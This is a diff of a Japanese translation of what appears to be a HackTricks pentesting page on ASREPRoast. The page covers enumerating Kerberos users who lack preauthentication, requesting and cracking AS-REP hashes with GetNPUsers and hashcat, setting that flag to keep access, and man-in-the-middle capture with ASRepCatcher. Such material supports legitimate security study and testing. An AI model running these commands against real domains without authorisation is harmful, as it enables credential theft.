@@ -32,7 +32,7 @@ Stay informed with the newest bug bounties launching and crucial platform update
 
 ## ASREPRoast
 
-ASREPRoastは、**Kerberos事前認証必須属性**を欠くユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、ユーザーのパスワード派生キーで暗号化されたメッセージで応答し、攻撃者はオフラインでそれを解読してユーザーのパスワードを発見しようとします。
+ASREPRoastは、**Kerberos事前認証必須属性**が欠如しているユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により攻撃者は、ユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、ユーザーのパスワード派生キーで暗号化されたメッセージで応答し、攻撃者はオフラインでそれを解読してユーザーのパスワードを発見しようとします。
 
 この攻撃の主な要件は次のとおりです：
 
@@ -52,9 +52,11 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### AS_REPメッセージのリクエスト
+{% endcode %}
 
-{% code title="Using Linux" %}
+#### AS\_REPメッセージのリクエスト
+
+{% code title="Linuxを使用して" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -81,7 +83,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistence
 
-**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を強制する必要はありません：
+**プレオーソリゼーション**が必要ないユーザーに対して、**GenericAll**権限（またはプロパティを書き込む権限）を持っている場合： 
 
 {% code title="Using Windows" %}
 ```bash
@@ -97,7 +99,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 ## ASREProast 認証情報なし
 
-攻撃者は、ネットワークを横断する AS-REP パケットをキャプチャするために中間者の位置を利用でき、Kerberos プレ認証が無効になっていることに依存しません。したがって、VLAN 上のすべてのユーザーに対して機能します。\
+攻撃者は、ネットワークを横断する AS-REP パケットをキャプチャするために中間者の位置を利用でき、Kerberos の事前認証が無効になっていることに依存しません。したがって、VLAN 上のすべてのユーザーに対して機能します。\
 [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使用することでこれを実現できます。さらに、このツールは Kerberos 交渉を変更することにより、クライアントワークステーションに RC4 を使用させることを強制します。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
@@ -123,12 +125,12 @@ ASRepCatcher listen
 ハッキングのスリルと課題に深く掘り下げたコンテンツに参加する
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界に遅れずについていく
+リアルタイムのニュースと洞察を通じて、急速に進化するハッキングの世界に遅れずについていく
 
 **最新のお知らせ**\
 新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得る
 
-**今すぐ** [**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、トップハッカーとコラボレーションを始めましょう！
+**私たちに参加して** [**Discord**](https://discord.com/invite/N3FrSbmwdy)で今日からトップハッカーとコラボレーションを始めましょう！
 
 {% hint style="success" %}
 AWSハッキングを学び、実践する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
